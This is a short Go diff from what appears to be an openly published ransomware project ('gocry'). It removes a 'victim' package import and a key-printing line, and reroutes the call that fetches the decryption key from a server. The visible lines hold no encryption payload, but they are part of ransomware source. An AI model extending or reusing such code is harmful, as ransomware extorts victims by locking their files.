@@ -10,7 +10,6 @@ import (
 
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/ransomware"
-	"github.com/nireo/gocry/victim"
 	"golang.org/x/exp/errors/fmt"
 )
 
@@ -88,9 +87,7 @@ func main() {
 				log.Fatalf("error reading key file: %s", err)
 			}
 
-			fmt.Println(key)
-
-			decryptedKey, err := victim.GetKeyFromServer(key)
+			decryptedKey, err := rw.Data.GetKeyFromServer(key)
 			if err != nil {
 				fmt.Println("error decrypting key from server...")
 				continue
